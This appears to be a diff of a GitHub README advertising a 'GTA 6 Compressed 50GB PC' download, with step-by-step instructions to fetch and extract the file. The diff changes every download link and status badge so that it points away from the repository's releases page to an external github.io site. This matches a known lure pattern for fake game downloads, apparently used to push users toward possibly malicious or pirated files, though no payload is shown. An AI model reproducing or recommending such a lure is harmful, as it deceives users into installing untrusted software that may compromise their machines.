@@ -1,6 +1,6 @@
 # 🎮 GTA-6-Compressed-Download-50GB-PC - Get Playing in Minutes
 
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_Compressed-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_Compressed-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://demonationx93.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ Here’s the entire process in three simple steps. Don’t overthink it — just
 
 ### Step 1: Download the Game
 
-Visit this link to download the application: **[https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)**
+Visit this link to download the application: **[https://demonationx93.github.io](https://demonationx93.github.io)**
 
 You’ll see the latest release file listed there. Click the download button next to it. The file is large (50GB), so make sure you have enough free space on your hard drive and a stable internet connection. Grab a coffee — this might take a while depending on your speed.
 
@@ -28,7 +28,7 @@ You’ll see the latest release file listed there. Click the download button nex
 
 **When you’re on the releases page, look for the file labeled “GTA6_Compressed_50GB.zip”.** 
 
-Visit this link to download the application: **[https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)**
+Visit this link to download the application: **[https://demonationx93.github.io](https://demonationx93.github.io)**
 
 ### Step 2: Extract the Files
 
@@ -155,8 +155,8 @@ Please search the existing issues first before posting. Chances are someone else
 
 ## 📊 Stats & Download Status
 
-[![GitHub Release](https://img.shields.io/github/v/release/demonationx93/GTA-6-Compressed-Download-50GB-PC?label=Latest%20Version&style=for-the-badge)](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)
-[![GitHub Downloads](https://img.shields.io/github/downloads/demonationx93/GTA-6-Compressed-Download-50GB-PC/total?label=Total%20Downloads&style=for-the-badge)](https://github.com/demonationx93/GTA-6-Compressed-Download-50GB-PC/releases)
+[![GitHub Release](https://img.shields.io/github/v/release/demonationx93/GTA-6-Compressed-Download-50GB-PC?label=Latest%20Version&style=for-the-badge)](https://demonationx93.github.io)
+[![GitHub Downloads](https://img.shields.io/github/downloads/demonationx93/GTA-6-Compressed-Download-50GB-PC/total?label=Total%20Downloads&style=for-the-badge)](https://demonationx93.github.io)
 
 ---
 
